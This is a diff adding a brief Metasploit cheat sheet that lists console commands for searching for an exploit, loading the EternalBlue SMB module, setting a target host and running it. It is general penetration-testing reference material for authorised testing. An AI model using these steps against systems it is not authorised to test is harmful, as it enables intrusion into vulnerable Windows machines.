@@ -1,0 +1,17 @@
+# metasploit
+# A framework for developing, testing, and executing exploits.
+
+# Start Metasploit console:
+msfconsole
+
+# Search for an exploit:
+search exploit_name
+
+# Use an exploit:
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Set exploit options:
+set RHOSTS 192.168.1.1
+
+# Run the exploit:
+run
